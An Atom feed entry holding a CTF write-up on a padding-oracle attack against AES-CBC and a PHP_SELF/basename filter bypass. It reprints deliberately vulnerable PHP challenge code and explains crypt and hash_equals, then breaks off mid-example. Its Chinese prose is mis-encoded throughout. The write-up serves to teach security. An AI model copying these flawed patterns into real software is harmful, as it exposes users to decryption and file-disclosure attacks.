<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Manayakko - å¾®ç¬‘æ‰æ˜¯ç‹é“</title>
  
  <subtitle>è¶ŠåŠªåŠ›ï¼Œè¶Šå¹¸è¿</subtitle>
  <link href="/yakko117/atom.xml" rel="self"/>
  
  <link href="https://manayakko.github.io/yakko117/"/>
  <updated>2022-01-03T08:45:28.457Z</updated>
  <id>https://manayakko.github.io/yakko117/</id>
  
  <author>
    <name>Manayakko</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BuuctfDay9</title>
    <link href="https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/"/>
    <id>https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/</id>
    <published>2022-01-03T04:15:43.394Z</published>
    <updated>2022-01-03T08:45:28.457Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å¾ˆä¹…æ²¡æ›´æ–°äº†ï¼Œå› ä¸ºå„ç§åŸå› æ‘¸äº†ä¸€å¹´å¤šçš„é±¼</p><h1 id="NPUCTF2020-webğŸ•"><a href="#NPUCTF2020-webğŸ•" class="headerlink" title="[NPUCTF2020] webğŸ•"></a>[NPUCTF2020] webğŸ•</h1><p>é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹é¢˜ç›®</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//å®šä¹‰åŠ å¯†æ–¹å¼</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//å®šä¹‰å¯†é’¥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h2><ul><li>PHP AES åŠ å¯†</li><li>CBCå­—èŠ‚ç¿»è½¬æ”»å‡» <a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/" target="_blank" rel="noopener">å¾®ç¬‘å¸ˆå‚…çš„åˆ†æè®²è§£</a> ä»¥åŠ <a href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html" target="_blank" rel="noopener">wooyunçš„æŠ€æœ¯åˆ†æå¸–</a></li><li>è¿˜æœ‰è¿™ç¯‡ <a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">Padding Oracleæ”»å‡»çš„åˆ†æå’Œæ€è€ƒï¼ˆè¯¦ç»†ï¼‰</a></li></ul><p>ç¨‹åºæ˜¯ <code>128ä½çš„cbc</code>ï¼Œ<code>blocksizeæ˜¯16å­—èŠ‚</code>ï¼ŒåŠ å¯† <code>IV</code> å·²çŸ¥ï¼Œ<code>secret</code> æœªçŸ¥<br>ä½†æ˜¯å¯ä»¥çŸ¥é“è§£å¯†æ˜¯å¦æˆåŠŸï¼Œè€Œä¸”å¯ä»¥æ§åˆ¶å¯†æ–‡å’Œè§£å¯†çš„ <code>IV</code><br>å¯ä»¥ä½¿ç”¨ <code>padding oracle</code> çˆ†å‡ºæ˜æ–‡</p><p>ä¸»è¦åŸç†æ˜¯æ ¹æ® <code>cbc</code> åœ¨ <code>IV padding</code> æ­£ç¡®çš„æƒ…å†µä¸‹çš„è¿”å›å€¼å’Œ <code>padding</code> é”™è¯¯ä¸‹çš„è¿”å›å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§é€ä½è¿˜åŸå¯†æ–‡ã€‚</p><p>æ‰¾åˆ°ä¸ª<a href="https://github.com/mpgn/Padding-oracle-attack" target="_blank" rel="noopener">è„šæœ¬</a></p><p><a href="https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md" target="_blank" rel="noopener">https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md</a></p><p><a href="http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener">http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/</a></p><p><a href="https://www.jianshu.com/p/7f171477a603" target="_blank" rel="noopener">https://www.jianshu.com/p/7f171477a603</a></p><hr><h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹"><a href="#ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹" class="headerlink" title="ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹"></a>ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹</h2><p><a href="https://www.php.net/manual/zh/function.hash-equals.php" target="_blank" rel="noopener">hash_equals å‡½æ•°</a><br><a href="https://www.php.net/manual/zh/function.crypt.php" target="_blank" rel="noopener">crypt åŠ å¯†å‡½æ•°</a></p><p>åœ¨å¯†ç å­¦ä¸­ï¼Œæ—¶åºæ”»å‡»æ˜¯ä¸€ç§ä¾§ä¿¡é“æ”»å‡»ï¼Œæ”»å‡»è€…è¯•å›¾é€šè¿‡åˆ†æåŠ å¯†ç®—æ³•çš„æ—¶é—´æ‰§è¡Œæ¥æ¨å¯¼å‡ºå¯†ç ã€‚æ¯ä¸€ä¸ªé€»è¾‘è¿ç®—åœ¨è®¡ç®—æœºéœ€è¦æ—¶é—´æ¥æ‰§è¡Œï¼Œæ ¹æ®è¾“å…¥ä¸åŒï¼Œç²¾ç¡®æµ‹é‡æ‰§è¡Œæ—¶é—´ï¼Œæ ¹æ®æ‰§è¡Œæ—¶é—´åæ¨å‡ºå¯†ç ã€‚</p><p>å¦‚æœæ˜¯ç”¨æ™®é€šçš„ <code>==</code> æ¥è¿›è¡Œæ¯”è¾ƒï¼Œé‚£ä¹ˆä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯ä»ç¬¬ä¸€ä½å¼€å§‹é€ä¸€è¿›è¡Œæ¯”è¾ƒçš„ï¼Œå‘ç°ä¸åŒå°±ç«‹å³è¿”å› <code>false</code>ï¼Œé‚£ä¹ˆé€šè¿‡è®¡ç®—è¿”å›çš„é€Ÿåº¦å°±çŸ¥é“äº†å¤§æ¦‚æ˜¯å“ªä¸€ä½å¼€å§‹ä¸åŒçš„ï¼Œ<code>php</code> ä¸­ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼Œå°±ä½¿ç”¨ <code>hash_equalså‡½æ•°</code>ã€‚</p><p>ç¤ºä¾‹å¦‚ä¸‹</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test  = crypt(<span class="string">'114514'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line">$AAA   = crypt(<span class="string">'114514'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line">$BBB = crypt(<span class="string">'manako'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(hash_equals($test, $AAA));</span><br><span class="line">var_dump(hash_equals($test, $BBB));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>å›æ˜¾</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure></div><p>è€Œå°†ç›å€¼ä¿®æ”¹ä¸ºè¦æ±‚çš„æ•£åˆ—ç±» <code>$2a$07$usesomesillystringforsalt$</code><br>æˆ–è€…å»æ‰boolå˜é‡å®šä¹‰ï¼Œç›´æ¥å°†ç›å€¼å˜æˆ <code>stringforsalt</code> è¿”å›ä¼šåˆ¤å®šä¸º <code>false</code></p><p>åŒæ—¶çœ‹åˆ°ä¸€å¥è¿™æ ·çš„è¯:</p><blockquote><p>When the failure string â€œ<em>0â€ is given as the salt, â€œ</em>1â€ will now be returned for consistency with other crypt implementations. Prior to this version, PHP 5.6 would incorrectly return a DES hash.</p></blockquote><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåŠ å¯†ç®—æ³•<br><code>crypt</code> æœ‰ä¸¤ä¸ªå‚æ•°ï¼š<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šåŠ å¯†å­—ç¬¦ä¸²<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šç›å€¼å­—ç¬¦ä¸² <code>/$str = &#39;123456789&#39;</code>;<br>ä½¿ç”¨è‡ªåŠ¨ç›å€¼ <code>echo&#39;è‡ªåŠ¨ ç›å€¼: &#39; . crypt($str) . &quot;\n&quot;;</code><br>å¦‚ <code>$1$yvnZHBo0$sBZBd0vzZYnxbtQftQulZ</code></p><hr><h2 id="ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨-crypt"><a href="#ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨-crypt" class="headerlink" title="ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()"></a>ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()</h2><h3 id="CRYPT-STD-DES-åŸºäºæ ‡å‡†-DES-ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨"><a href="#CRYPT-STD-DES-åŸºäºæ ‡å‡†-DES-ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨" class="headerlink" title="CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨"></a>CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨</h3><p><code>./0-9A-Za-z</code> å­—ç¬¦ä¸­çš„ä¸¤ä¸ªå­—ç¬¦ä½œä¸ºç›å€¼ã€‚<br>åœ¨ç›å€¼ä¸­ä½¿ç”¨éæ³•çš„å­—ç¬¦å°†å¯¼è‡´ <code>crypt()</code> å¤±è´¥ã€‚</p><h3 id="CRYPT-EXT-DES-æ‰©å±•çš„åŸºäº-DES-ç®—æ³•çš„æ•£åˆ—ã€‚"><a href="#CRYPT-EXT-DES-æ‰©å±•çš„åŸºäº-DES-ç®—æ³•çš„æ•£åˆ—ã€‚" class="headerlink" title="CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚"></a>CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚</h3><p>å…¶ç›å€¼ä¸º <code>9</code> ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œç”± <code>1</code> ä¸ªä¸‹åˆ’çº¿åé¢è·Ÿç€ <code>4</code> å­—èŠ‚å¾ªç¯æ¬¡æ•°å’Œ <code>4</code> å­—èŠ‚ç›å€¼ç»„æˆã€‚<br>å®ƒä»¬è¢«ç¼–ç æˆå¯æ‰“å°å­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦ <code>6</code> ä½ï¼Œæœ‰æ•ˆä½æœ€å°‘çš„ä¼˜å…ˆã€‚<br><code>0</code> åˆ° <code>63</code> è¢«ç¼–ç ä¸º <code>./0-9A-Za-z</code>ã€‚</p><h3 id="CRYPT-MD5-MD5-æ•£åˆ—"><a href="#CRYPT-MD5-MD5-æ•£åˆ—" class="headerlink" title="CRYPT_MD5 - MD5 æ•£åˆ—"></a>CRYPT_MD5 - MD5 æ•£åˆ—</h3><p>ä½¿ç”¨ä¸€ä¸ªä»¥ <code>$1$</code> å¼€å§‹çš„ <code>12</code> å­—ç¬¦çš„å­—ç¬¦ä¸²ç›å€¼ã€‚</p><h3 id="CRYPT-BLOWFISH-Blowfish-ç®—æ³•"><a href="#CRYPT-BLOWFISH-Blowfish-ç®—æ³•" class="headerlink" title="CRYPT_BLOWFISH - Blowfish ç®—æ³•"></a>CRYPT_BLOWFISH - Blowfish ç®—æ³•</h3><p>ä½¿ç”¨å¦‚ä¸‹ç›å€¼ï¼š<code>$2a$</code>ï¼Œä¸€ä¸ªä¸¤ä½ <code>cost</code> å‚æ•°ï¼Œ<code>$</code> ä»¥åŠ <code>64</code> ä½ç”± <code>./0-9A-Za-z</code> ä¸­çš„å­—ç¬¦ç»„åˆè€Œæˆçš„å­—ç¬¦ä¸²ã€‚<br>åœ¨ç›å€¼ä¸­ä½¿ç”¨æ­¤èŒƒå›´ä¹‹å¤–çš„å­—ç¬¦å°†å¯¼è‡´ <code>crypt()</code> è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚<br>ä¸¤ä½ <code>cost</code> å‚æ•°æ˜¯å¾ªç¯æ¬¡æ•°ä»¥ <code>2</code> ä¸ºåº•çš„å¯¹æ•°ï¼Œå®ƒçš„èŒƒå›´æ˜¯ <code>04-31</code>ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´å°†å¯¼è‡´ <code>crypt()</code> å¤±è´¥ã€‚</p><p><font color="red">ï¼ï¼ï¼éœ€è¦æ³¨æ„åˆ°ä¸€ç‚¹</font>ï¼Œç›å€¼è¦æ±‚ä¸º <code>64ä½</code>ï¼Œé•¿åº¦ä¸æ»¡è¶³å°±ä¼šåŠ å¯†å¤±è´¥ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢çš„ç¤ºä¾‹ä½¿ç”¨<code>$2a$07$stringforsalt$</code> ä¼šå‡ºç° <code>hash</code> éªŒè¯ä¸º <code>true</code>;</p><h3 id="CRYPT-SHA256-SHA512-æ•£åˆ—ç®—æ³•"><a href="#CRYPT-SHA256-SHA512-æ•£åˆ—ç®—æ³•" class="headerlink" title="CRYPT_SHA256/SHA512 æ•£åˆ—ç®—æ³•"></a>CRYPT_SHA256/SHA512 æ•£åˆ—ç®—æ³•</h3><p><code>SHA-256</code> ç®—æ³•ä½¿ç”¨ä¸€ä¸ªä»¥ <code>$5$</code> å¼€å¤´çš„ <code>16</code> å­—ç¬¦å­—ç¬¦ä¸²ç›å€¼è¿›è¡Œæ•£åˆ—<br>å¦‚æœç›å€¼å­—ç¬¦ä¸²ä»¥ <code>rounds=$</code> å¼€å¤´ï¼Œ<code>N</code> çš„æ•°å­—å€¼å°†è¢«ç”¨æ¥æŒ‡å®šæ•£åˆ—å¾ªç¯çš„æ‰§è¡Œæ¬¡æ•°ï¼Œè¿™ç‚¹å¾ˆåƒ Blowfish ç®—æ³•çš„ <code>cost</code> å‚æ•°ã€‚é»˜è®¤çš„å¾ªç¯æ¬¡æ•°æ˜¯ <code>5000</code>ï¼Œæœ€å°æ˜¯ <code>1000</code>ï¼Œæœ€å¤§æ˜¯ <code>999,999,999</code>ã€‚è¶…å‡ºè¿™ä¸ªèŒƒå›´çš„ <code>N</code> å°†ä¼šè¢«è½¬æ¢ä¸ºæœ€æ¥è¿‘çš„å€¼ã€‚</p><p><code>SHA-256</code> å’Œ <code>SHA-512</code> åŒç†</p><p>åŠ å¯†ç¤ºä¾‹</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (CRYPT_STD_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Standard DES: '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'rl'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_EXT_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Extended DES: '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'_J9..rasm'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_MD5 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'MD5:          '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$1$rasmusle$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_BLOWFISH == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Blowfish:     '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$2a$07$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA256 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'SHA-256:      '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$5$rounds=5000$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA512 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'SHA-512:      '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$6$rounds=5000$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="å›å½’åˆ°è§£é¢˜æœ¬èº«"><a href="#å›å½’åˆ°è§£é¢˜æœ¬èº«" class="headerlink" title="å›å½’åˆ°è§£é¢˜æœ¬èº«"></a>å›å½’åˆ°è§£é¢˜æœ¬èº«</h2><h3 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1"></a>æ€è·¯1</h3><p>æ¯”è¾ƒä¸¤ä¸ªæäº¤çš„å‚æ•°æ˜¯å¦ç›¸ç­‰ï¼Œåˆ™ç»™å‡ºflagï¼Œ<code>random_bytes</code>å‡½æ•°ç”Ÿæˆé€‚åˆäºåŠ å¯†ä½¿ç”¨çš„ä»»æ„é•¿åº¦çš„åŠ å¯†éšæœºå­—èŠ‚å­—ç¬¦ä¸²ï¼Œéšåé€šè¿‡<code>bin2hex</code>è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="comment">//éœ€è¦å°†PHP version æ›´æ”¹ä¸º&gt;=7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> (random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2"></a>æ€è·¯2</h3><p>ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼è®¿é—®å¼€å¤´æºç æç¤ºflagçš„config.php</p><p>éœ€è¦äº†è§£çš„å‡ ä¸ªä¸œè¥¿ <a href="https://www.php.net/basename" target="_blank" rel="noopener">basenameå‡½æ•°</a> ä»¥åŠ <a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">å‡½æ•°æ¼æ´</a><br><a href="https://blog.csdn.net/weixin_42314192/article/details/116257437" target="_blank" rel="noopener">å‚è€ƒæ€è·¯ï¼ŒPHPé‡Œçš„basenameå‡½æ•°ä¸æ”¯æŒä¸­æ–‡åçš„è§£å†³</a></p><p>é¦–å…ˆå…ˆçœ‹å…¨å±€å˜é‡ <code>$_SERVER[â€˜PHP_SELFâ€™]</code> </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[â€˜PHP_SELFâ€™] è·å–å½“å‰é¡µé¢åœ°å€</span><br><span class="line">æ˜¯å½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.test.com/php/ | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php?test=yakko | 